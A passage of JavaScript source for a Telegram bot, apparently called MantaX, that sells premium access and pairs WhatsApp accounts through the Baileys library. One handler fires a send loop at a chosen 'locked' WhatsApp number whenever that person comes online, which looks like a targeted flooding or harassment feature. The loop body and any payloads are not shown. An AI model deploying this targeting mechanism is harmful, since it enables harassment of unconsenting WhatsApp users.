♛ Durasi  : 1d / 7d / 30d / 1h / 1m
༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];

  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — ID TIDAK VALID
♛ Info    : User ID harus berupa angka
♛ Contoh  : /addprem 123456789 30d
༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
  }

  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — DURASI TIDAK VALID
♛ Info    : Gunakan angka + d/h/m
♛ Contoh  : 30d = 30 hari
♛ Contoh  : 12h = 12 jam
♛ Contoh  : 60m = 60 menit
༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
  }

  const unit = duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes';
  const unitLabel = duration.slice(-1) === 'd' ? 'Hari' : duration.slice(-1) === 'h' ? 'Jam' : 'Menit';
  const expirationDate = moment().add(parseInt(duration), unit);
  const expFormatted = expirationDate.format('DD-MM-YYYY HH:mm:ss');

  await syncPremium();
  const existing = premiumUsers.find(user => user.id === userId);

  if (!existing) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    await savePremiumUsers();
    console.log(`[ADDPREM] ${senderId} → ${userId} premium hingga ${expFormatted}`);
    bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — PREMIUM DITAMBAHKAN
♛ User ID : ${userId}
♛ Durasi  : ${parseInt(duration)} ${unitLabel}
♛ Aktif   : ${moment().format('DD-MM-YYYY HH:mm:ss')}
♛ Expired : ${expFormatted}
♛ Status  : 🔥 Berhasil Ditambahkan
༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
  } else {
    existing.expiresAt = expirationDate.toISOString();
    await savePremiumUsers();
    console.log(`[ADDPREM] ${senderId} → ${userId} extend premium hingga ${expFormatted}`);
    bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — PREMIUM DIPERPANJANG
♛ User ID : ${userId}
♛ Durasi  : ${parseInt(duration)} ${unitLabel}
♛ Expired : ${expFormatted}
♛ Status  : 🔥 Berhasil Diperpanjang
༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
  }
});
bot.onText(/^\/premgb\s+([\d\s dhm]+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !developerIds.includes(String(senderId)) &&
    !adminUsers.some(a => String(a.id) === String(senderId))) {
    return bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — AKSES DITOLAK
♛ Status  : Bukan Owner / Admin
♛ Info    : Lu Siapa? Emang Gw Kenal?
༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
  }

  if (msg.chat.type === "private") {
    return bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — GAGAL
♛ Info    : Perintah ini hanya bisa digunakan di grup
༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
  }

  const durationStr = match[1].trim();
  const ms = parseDuration(durationStr);

  if (ms <= 0) {
    return bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — DURASI TIDAK VALID
♛ Contoh  : /premgb 1d
♛ Contoh  : /premgb 1d 6h 30m
♛ Contoh  : /premgb 12h
༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
  }

  const expiresAt = new Date(Date.now() + ms).toISOString();
  const existing = premiumGroups.findIndex(g => String(g.id) === String(chatId));

  if (existing >= 0) {
    premiumGroups[existing].expiresAt = expiresAt;
  } else {
    premiumGroups.push({ id: String(chatId), name: msg.chat.title || "Unknown", expiresAt });
  }

  savePremiumGroups();

  const expDate = new Date(expiresAt).toLocaleString("id-ID", { timeZone: "Asia/Makassar", hour12: false });

  return bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — GROUP PREMIUM
♛ Grup    : ${msg.chat.title || chatId}
♛ Durasi  : ${durationStr}
♛ Expired : ${expDate} WITA
♛ Status  : AKTIF ✅
༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
});
bot.onText(/^\/delgb$/i, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !developerIds.includes(String(senderId)) &&
    !adminUsers.some(a => String(a.id) === String(senderId))) {
    return bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — AKSES DITOLAK
♛ Status  : Bukan Owner / Admin
♛ Info    : Lu Siapa? Emang Gw Kenal?
༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
  }

  if (msg.chat.type === "private") {
    return bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — GAGAL
♛ Info    : Perintah ini hanya bisa digunakan di grup
༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
  }

  const index = premiumGroups.findIndex(g => String(g.id) === String(chatId));

  if (index === -1) {
    return bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — GAGAL
♛ Info    : Grup ini bukan premium
༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
  }

  premiumGroups.splice(index, 1);
  savePremiumGroups();

  return bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — GROUP PREMIUM
♛ Grup    : ${msg.chat.title || chatId}
♛ Status  : DIHAPUS 
༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
});
bot.onText(/\/cekprem/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  await syncPremium();

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — AKSES DITOLAK
♛ Status  : Bukan Owner / Admin
༒︎ •၊.,||.,|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — LIST PREMIUM
♛ Status  : Belum Ada User Premium
༒︎ •၊.,||.,|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
  }

  const perPage = 10;
  const pages = [];

  for (let i = 0; i < premiumUsers.length; i += perPage) {
    const chunk = premiumUsers.slice(i, i + perPage);

    let list = "";
    chunk.forEach((user, index) => {
      const exp = moment(user.expiresAt).format('DD-MM-YYYY HH:mm:ss');
      const sisa = moment(user.expiresAt).diff(moment(), 'days');
      const status = sisa > 0 ? `🔥 Aktif (${sisa} hari lagi)` : "💀 Expired";

      list += `♛ ${i + index + 1}. ID : ${user.id}\n   Expired : ${exp}\n   Status  : ${status}\n\n`;
    });

    pages.push(list.trim());
  }

  bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — LIST PREMIUM
♛ Total   : ${premiumUsers.length} User

${pages[0]}
༒︎ •၊.,||.,|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: pages.length > 1 ? {
      inline_keyboard: [
        [{ text: "➡️ Next", callback_data: `prem_1` }]
      ]
    } : undefined
  });
});

bot.on('callback_query', async (query) => {
  const data = query.data;
  const chatId = query.message.chat.id;

  if (!data.startsWith('prem_')) return;

  await syncPremium();
  await bot.answerCallbackQuery(query.id);

  const page = parseInt(data.split('_')[1]);

  const perPage = 10;
  const pages = [];

  for (let i = 0; i < premiumUsers.length; i += perPage) {
    const chunk = premiumUsers.slice(i, i + perPage);

    let list = "";
    chunk.forEach((user, index) => {
      const exp = moment(user.expiresAt).format('DD-MM-YYYY HH:mm:ss');
      const sisa = moment(user.expiresAt).diff(moment(), 'days');
      const status = sisa > 0 ? `🔥 Aktif (${sisa} hari lagi)` : "💀 Expired";

      list += `♛ ${i + index + 1}. ID : ${user.id}\n   Expired : ${exp}\n   Status  : ${status}\n\n`;
    });

    pages.push(list.trim());
  }

  const buttons = [];

  if (page > 0) {
    buttons.push({ text: "⬅️ Prev", callback_data: `prem_${page - 1}` });
  }
  if (page < pages.length - 1) {
    buttons.push({ text: "➡️ Next", callback_data: `prem_${page + 1}` });
  }

  await bot.editMessageCaption(`\`\`\`
✘ мαηтα'χ — LIST PREMIUM
♛ Total   : ${premiumUsers.length} User

${pages[page]}
༒︎ •၊.,||.,|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, {
    chat_id: chatId,
    message_id: query.message.message_id,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [buttons]
    }
  });
});

bot.onText(/\/addadmin(?:\s(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  await syncAdmin();

  if (!isOwner(senderId)) {
    return bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — AKSES DITOLAK
♛ Status  : Khusus Owner
༒︎ •၊.,||.,|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
  }

  if (!match || !match[1]) {
    return bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — FORMAT SALAH
♛ Contoh  : /addadmin 123456789
༒︎ •၊.,||.,|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — ID TIDAK VALID
♛ Contoh  : /addadmin 123456789
༒︎ •၊.,||.,|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
  }

  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    await saveAdminUsers();
    console.log(`[ADDADMIN] ${senderId} → ${userId}`);
    bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — ADMIN DITAMBAHKAN
♛ User ID : ${userId}
♛ Status  : 🔥 Berhasil Ditambahkan
༒︎ •၊.,||.,|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
  } else {
    bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — SUDAH ADMIN
♛ User ID : ${userId}
♛ Status  : Sudah Terdaftar Sebagai Admin
༒︎ •၊.,||.,|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
  }
});

bot.onText(/\/deladmin(?:\s(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  await syncAdmin();

  if (!isOwner(senderId)) {
    return bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — AKSES DITOLAK
♛ Status  : Khusus Owner
༒︎ •၊.,||.,|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
  }

  if (!match || !match[1]) {
    return bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — FORMAT SALAH
♛ Contoh  : /deladmin 123456789
༒︎ •၊.,||.,|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — ID TIDAK VALID
♛ Contoh  : /deladmin 123456789
༒︎ •၊.,||.,|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
  }

  const adminIndex = adminUsers.indexOf(userId);
  if (adminIndex !== -1) {
    adminUsers.splice(adminIndex, 1);
    await saveAdminUsers();
    console.log(`[DELADMIN] ${senderId} → ${userId}`);
    bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — ADMIN DIHAPUS
♛ User ID : ${userId}
♛ Status  : 🔥 Berhasil Dihapus
༒︎ •၊.,||.,|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
  } else {
    bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — TIDAK DITEMUKAN
♛ User ID : ${userId}
♛ Status  : Bukan Admin
༒︎ •၊.,||.,|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
  }
});

bot.onText(/\/cekadmin/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  await syncAdmin();

  if (!isOwner(senderId)) {
    return bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — AKSES DITOLAK
♛ Status  : Khusus Owner
༒︎ •၊.,||.,|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
  }

  if (adminUsers.length === 0) {
    return bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — LIST ADMIN
♛ Status  : Belum Ada Admin Terdaftar
༒︎ •၊.,||.,|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
  }

  let list = "";
  adminUsers.forEach((id, index) => {
    list += `♛ ${index + 1}. ID : ${id}\n`;
  });

  bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — LIST ADMIN
♛ Total   : ${adminUsers.length} Admin

${list.trim()}
༒︎ •၊.,||.,|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
});

bot.onText(/\/delprem(?:\s(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — AKSES DITOLAK
♛ Status  : Bukan Owner / Admin
༒︎ •၊.,||.,|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — FORMAT SALAH
♛ Contoh  : /delprem 123456789
༒︎ •၊.,||.,|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
  }

  const userId = parseInt(match[1]);
  if (isNaN(userId)) {
    return bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — ID TIDAK VALID
♛ Contoh  : /delprem 123456789
༒︎ •၊.,||.,|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
  }

  await syncPremium();
  const index = premiumUsers.findIndex(user => user.id === userId);
  if (index === -1) {
    return bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — TIDAK DITEMUKAN
♛ User ID : ${userId}
♛ Status  : Bukan User Premium
༒︎ •၊.,||.,|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
  }

  premiumUsers.splice(index, 1);
  await savePremiumUsers();
  console.log(`[DELPREM] ${senderId} → ${userId}`);
  bot.sendMessage(chatId, `\`\`\`
✘ мαηтα'χ — PREMIUM DIHAPUS
♛ User ID : ${userId}
♛ Status  : 🔥 Berhasil Dihapus
༒︎ •၊.,||.,|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``, { parse_mode: "Markdown" });
});

bot.onText(/\/cekid/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const vrem = msg.from.is_premium;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const username = msg.from.username;


  if (shouldIgnoreMessage(msg)) return;
  bot.sendMessage(chatId, `
ID KAMU
×͜× Username : @${username}
×͜× Id: ${senderId}
×͜× Telegram Premium: ${vrem ? "✔️" : "✖️"}
┗━━━━━━━━━━━━━━━━━━⬣
𝘾𝙍𝙀𝘼𝙏𝙀 𝘽𝙔 мαηтα'χ:)`);
});

bot.onText(/\/chatid/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const username = msg.from.username;
  const grouporno = msg.chat.type;
  let gbjir = "";

  if (grouporno === "private") {
    gbjir = "Private chatt"
  } else if (grouporno === "supergroup" || grouporno === "group") {
    gbjir = "Group Chatt"
  }

  if (shouldIgnoreMessage(msg)) return;
  bot.sendMessage(chatId, `
ID CHATT INI
×͜× Chatt Name : @${grouporno}
×͜× Id: ${chatId} 
┗━━━━━━━━━━━━━━━━━━⬣
𝘾𝙍𝙀𝘼𝙏𝙀 𝘽𝙔 мαηтα'χ:)`);
});


function getSessionPathForUser(uid, phoneNumber = null) {
  if (phoneNumber) {
    const cleanNumber = String(phoneNumber).replace(/[^0-9]/g, '');
    return path.join(__dirname, 'viawa', `session_${uid}_${cleanNumber}`);
  }
  return path.join(__dirname, 'viawa', `session_${uid}`);
}

async function deleteSessionForUser(uid, phoneNumber = null) {
  const sessionPath = getSessionPathForUser(uid, phoneNumber);
  if (fs.existsSync(sessionPath)) {
    fs.rmSync(sessionPath, { recursive: true, force: true });
  }
}

async function getBuffer(url, options = {}) {
  try {
    const res = await axios({
      method: 'get',
      url,
      headers: { 'DNT': 1, 'Upgrade-Insecure-Request': 1 },
      ...options,
      responseType: 'arraybuffer'
    });
    return res.data;
  } catch (err) {
    console.error(err);
    return Buffer.alloc(0);
  }
}

function getSizeMedia(path) {
  return new Promise((resolve, reject) => {
    if (/http/.test(path)) {
      axios.get(path).then((res) => {
        let length = parseInt(res.headers['content-length']);
        if (!isNaN(length)) {
          resolve(length);
        } else {
          resolve(Buffer.byteLength(res.data));
        }
      }).catch((err) => {
        console.error(err);
        reject(err);
      });
    } else if (Buffer.isBuffer(path)) {
      resolve(Buffer.byteLength(path));
    } else {
      reject(new Error('Format tidak didukung'));
    }
  });
}

// smsg function moved to helpers.js and imported at the top

const clients = new Map();

async function initWhatsappForUser(
  telegramuid,
  phoneNumber = null,
  notifyUser = true,
  retryCount = 0
) {
  const {
    default: makeWASocket,
    useMultiFileAuthState,
    makeCacheableSignalKeyStore,
    makeInMemoryStore,
    DisconnectReason,
    downloadContentFromMessage,
    getContentType,
    fetchLatestBaileysVersion,
    proto
  } = require('@ayunlove/bails');

  const MAX_RETRIES = 5;
  const RECONNECT_DELAY = 5000;

  const uid = String(telegramuid);
  const sessionPath = getSessionPathForUser(uid, phoneNumber);
  const clientKey = phoneNumber ? `${uid}_${String(phoneNumber).replace(/[^0-9]/g, '')}` : uid;

  try {
    console.log(`[MantaX] Memulai inisialisasi untuk UID: ${uid} | Nomor: ${phoneNumber}`);

    if (!fs.existsSync(sessionPath)) {
      fs.mkdirSync(sessionPath, { recursive: true });
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);

    const otax = makeWASocket({
      logger: pino({ level: "silent" }),
      printQRInTerminal: false,
      auth: {
        creds: state.creds,
        keys: makeCacheableSignalKeyStore(
          state.keys,
          pino({ level: "silent" })
        ),
      },
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      syncFullHistory: false,
      markOnlineOnConnect: false,
    });

    const store = makeInMemoryStore({
      logger: pino({ level: "silent" }).child({ stream: "store" }),
    });
    store.bind(otax.ev);

    if (phoneNumber && !state.creds?.registered && !state.creds?.me) {
      console.log(`[MantaX] Meminta kode pairing untuk nomor: ${phoneNumber}...`);
      setTimeout(async () => {
        try {
          let code = await otax.requestPairingCode(phoneNumber, "MANTAXXX");
          let formattedCode = code?.match(/.{1,4}/g)?.join('-') || code;

          console.log(`[MantaX] Berhasil mendapatkan kode: ${formattedCode}`);

          await bot.sendMessage(
            telegramuid,
            `\`\`\`
✘ мαηтα'χ — PAIRING CODE
♛ Code    : ${formattedCode}
♛ Status  : Awaiting Verification

Salin kode di atas dan masukkan pada
notifikasi WhatsApp yang muncul.
༒︎ •၊.,||.,|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``,
            { parse_mode: "Markdown" }
          );
        } catch (err) {
          console.error(`[MantaX ERROR] Gagal request kode pairing:`, err);
          await bot.sendMessage(
            telegramuid,
            `\`\`\`
✘ мαηтα'χ — PAIRING FAILED
♛ Status  : Error Requesting Code
♛ Hint    : Gunakan awalan 62 (ID)

Gagal meminta kode pairing. Pastikan
nomor sudah benar dan coba kembali.
༒︎ •၊.,||.,|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``,
            { parse_mode: "Markdown" }
          );
        }
      }, 3000);
    } else if (phoneNumber && state.creds?.registered) {
      console.log(`[MantaX] Nomor ${phoneNumber} sudah terdaftar di sesi. Melewati request kode.`);
    }

    otax.ev.on("creds.update", saveCreds);

    otax.ev.on("messages.upsert", async (chatUpdate) => {
      try {
        if (!chatUpdate.messages || !chatUpdate.messages.length) return;
        const mek = chatUpdate.messages[0];
        if (!mek.message) return;
        if (mek.key?.remoteJid === "status@broadcast") return;
        if (mek.key?.id?.startsWith("BAE5") && mek.key.id.length === 16) return;

        const msgType = Object.keys(mek.message)[0];
        mek.message =
          msgType === "ephemeralMessage"
            ? mek.message.ephemeralMessage.message
            : mek.message;
        if (mek.message?.protocolMessage?.type === 14) {
          const edited = mek.message.protocolMessage.editedMessage;
        }

        const m = smsg(otax, mek, store);

        if (m.isGroup) {
          try {
            const groupData = await otax
              .groupMetadata(m.chat)
              .catch(() => null);
            if (!groupData) {
              return;
            }
          } catch (err) {
            console.error(`[MantaX ERROR] Gagal mengambil metadata grup:`, err);
            return;
          }
        }

        await require("./main")(otax, m, chatUpdate, store);
      } catch (err) {
        console.error(`[MantaX ERROR] Error di messages.upsert:`, err);
      }
    });

    otax.ev.on("presence.update", async (update) => {
      try {
        const target = update.id;
        const data = update.presences?.[target];
        if (!target || !data) return;
        if (!locked.has(target)) return;
        const status = data.lastKnownPresence || data.presence || data.lastSeen || null;
        if (!status) return;
        if (status === "available") {
          await sendLoop(otax, target);
        }
      } catch (e) {
        console.error("error:", e);
      }
    });

    otax.getFile = async (PATH, save) => {
      let res;
      let data;
      let filename;

      if (Buffer.isBuffer(PATH)) {
        data = PATH;
      } else if (/^data:.*?\/.*?;base64,/i.test(PATH)) {
        data = Buffer.from(PATH.split`,`[1], "base64");
      } else if (/^https?:\/\//.test(PATH)) {
        res = await getBuffer(PATH);
        data = res;
      } else if (fs.existsSync(PATH)) {
        filename = PATH;
        data = fs.readFileSync(PATH);
      } else if (typeof PATH === "string") {
        data = PATH;
      } else {
        data = Buffer.alloc(0);
      }

      let type = (await FileType.fromBuffer(data)) || {
        mime: "application/octet-stream",
        ext: ".bin",
      };
      filename = path.join(__filename, "../" + new Date() * 1 + "." + type.ext);

      if (data && save) {
        await fs.promises.writeFile(filename, data);
      }

      return { res, filename, size: await getSizeMedia(data), ...type, data };
    };

    otax.downloadMediaMessage = async (message) => {
      let mime = (message.msg || message).mimetype || "";
      let messageType = message.mtype
        ? message.mtype.replace(/Message/gi, "")
        : mime.split("/")[0];

      try {
        const stream = await downloadContentFromMessage(message, messageType);
        let buffer = Buffer.from([]);

        for await (const chunk of stream) {
          buffer = Buffer.concat([buffer, chunk]);
        }

        return buffer;
      } catch (err) {
        console.error(`[MantaX ERROR] Gagal download media:`, err);
        return Buffer.alloc(0);
      }
    };

    otax.sendText = (jid, text, quoted = "", options = {}) => {
      return otax.sendMessage(jid, { text, ...options }, { quoted });
    };

    otax.setStatus = async (status) => {
      try {
        await otax.query({
          tag: "iq",
          attrs: { to: "@s.whatsapp.net", type: "set", xmlns: "status" },
          content: [
            { tag: "status", attrs: {}, content: Buffer.from(status, "utf-8") },
          ],
        });
      } catch (err) {
        console.error(`[MantaX ERROR] Gagal set status:`, err);
      }
    };

    otax.getName = async (jid) => {
      jid = jid.includes('@') ? jid : jid + '@s.whatsapp.net';

      let v;

      if (jid.endsWith('@g.us')) {
        const group = await otax.groupMetadata(jid);
        v = group.subject;
      } else {
        v =
          sock.contacts[jid]?.name ||
          sock.contacts[jid]?.notify ||
          jid.split('@')[0];
      }

      return v;
    };

    const clientData = {
      otax,
      status: "connecting",
      sessionPath,
      reconnecting: false,
      phoneNumber: phoneNumber
    };

    clients.set(clientKey, clientData);

    otax.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update || {};

      try {
        if (connection === "close") {
          const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
          console.log(`[MantaX] Koneksi terputus untuk Key: ${clientKey}. Alasan: ${reason}`);

          const client = clients.get(clientKey);
          if (client) {
            client.status = "closed";
          }

          if (
            reason === DisconnectReason.loggedOut ||
            reason === 401 ||
            reason === 403
          ) {
            console.log(`[MantaX] Sesi logged out/banned untuk Key: ${clientKey}. Menghapus sesi...`);
            await deleteSessionForUser(uid, phoneNumber).catch(console.error);

            try {
              if (client?.otax?.end) {
                await client.otax.end();
              }
            } catch { }

            clients.delete(clientKey);

            try {
              await bot.sendMessage(
                telegramuid,
                `\`\`\`
✘ мαηтα'χ — SESSION TERMINATED
♛ Number  : ${phoneNumber || 'Unknown'}
♛ Status  : Logged Out / Banned
♛ Action  : Session Deleted

Sesi WhatsApp Anda telah terputus atau
diblokir. Silakan lakukan pairing ulang.
༒︎ •၊.,||.,|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``,
                { parse_mode: "Markdown" },
              );
            } catch (err) {
              console.error(err);
            }
          } else {
            const client = clients.get(clientKey);

            if (client && !client.reconnecting && retryCount < MAX_RETRIES) {
              client.reconnecting = true;
              console.log(`[MantaX] Mencoba menyambung ulang Key: ${clientKey}... (Percobaan ${retryCount + 1}/${MAX_RETRIES})`);

              setTimeout(() => {
                if (clients.get(clientKey)) {
                  clients.get(clientKey).reconnecting = false;
                }

                initWhatsappForUser(telegramuid, phoneNumber, notifyUser, retryCount + 1);
              }, RECONNECT_DELAY);
            } else if (retryCount >= MAX_RETRIES) {
              console.log(`[MantaX] Gagal menyambung ulang Key: ${clientKey} setelah ${MAX_RETRIES} percobaan. Menghapus sesi.`);
              try {
                await deleteSessionForUser(uid, phoneNumber).catch(console.error);

                try {
                  if (clients.get(clientKey)?.otax?.end) {
                    await clients.get(clientKey).otax.end();
                  }
                } catch { }

                clients.delete(clientKey);

                await bot.sendMessage(
                  telegramuid,
                  `\`\`\`
✘ мαηтα'χ — AUTO CLEANUP
♛ Number  : ${phoneNumber || 'Unknown'}
♛ Reason  : Reconnection Exhausted
♛ Status  : Session Removed

Gagal menyambung ulang setelah 5 kali
percobaan. Sesi dihapus otomatis.
༒︎ •၊.,||.,|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``,
                  { parse_mode: "Markdown" },
                );
              } catch (err) {
                console.error(err);
              }
            }
          }
        } else if (connection === "open") {
          console.log(`[MantaX] Koneksi WA terbuka untuk Key: ${clientKey}`);
          const client = clients.get(clientKey);
          if (client) {
            client.status = "open";
          }

          const clientData = clients.get(clientKey) || {};
          const { pairingMessageId, waitMessageId } = clientData;

          try {
            if (pairingMessageId) {
              await bot
                .deleteMessage(telegramuid, pairingMessageId)
                .catch(() => { });
            }

            if (waitMessageId) {
              await bot
                .deleteMessage(telegramuid, waitMessageId)
                .catch(() => { });
            }

            if (clients.get(clientKey)) {
              clients.get(clientKey).pairingMessageId = null;
              clients.get(clientKey).waitMessageId = null;
            }
          } catch (e) {
            console.error(`[MantaX ERROR] Gagal membersihkan pesan:`, e);
          }

          if (notifyUser) {
            try {
              await bot.sendMessage(
                telegramuid,
                `\`\`\`
✘ мαηтα'χ — CONNECTION READY
♛ Number  : ${phoneNumber || 'Existing Session'}
♛ Status  : Successfully Paired
♛ System  : Online & Responsive

WhatsApp OTAX berhasil tersambung.
Sesi Anda siap menerima perintah.
༒︎ •၊.,||.,|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``,
                { parse_mode: "Markdown" },
              );
            } catch (err) {
              console.error(err);
            }
          }
        }
      } catch (e) {
        console.error(`[MantaX ERROR] Error di connection.update untuk Key: ${clientKey}:`, e);
      }
    });

    return otax;
  } catch (err) {
    console.error(`[MantaX FATAL ERROR] Inisialisasi WhatsApp gagal:`, err);
    return null;
  }
}

// ═══ AUTO RECONNECT SESI SAAT STARTUP ═══
(async () => {
  try {
    const viawaDir = path.join(__dirname, 'viawa');
    if (!fs.existsSync(viawaDir)) return;

    const folders = fs.readdirSync(viawaDir).filter(f => {
      return f.startsWith('session_') && fs.statSync(path.join(viawaDir, f)).isDirectory();
    });

    if (folders.length === 0) {
      console.log('[MantaX] Tidak ada sesi tersimpan untuk di-reconnect.');
      return;
    }

    console.log(`[MantaX] Ditemukan ${folders.length} sesi tersimpan. Memulai auto-reconnect...`);

    for (const folder of folders) {
      const parts = folder.split('_');
      const uid = parts[1];
      const phoneNumber = parts[2] || null;

      if (!uid || isNaN(Number(uid))) continue;
      const clientKey = phoneNumber ? `${uid}_${phoneNumber}` : uid;
      if (clients.has(clientKey)) continue;

      // Cek apakah session sudah registered sebelum auto-reconnect
      const credsFile = path.join(viawaDir, folder, 'creds.json');
      if (fs.existsSync(credsFile)) {
        try {
          const creds = JSON.parse(fs.readFileSync(credsFile, 'utf-8'));
          // Cek apakah session sudah registered atau memiliki data akun (me)
          if (!creds.registered && !creds.me) {
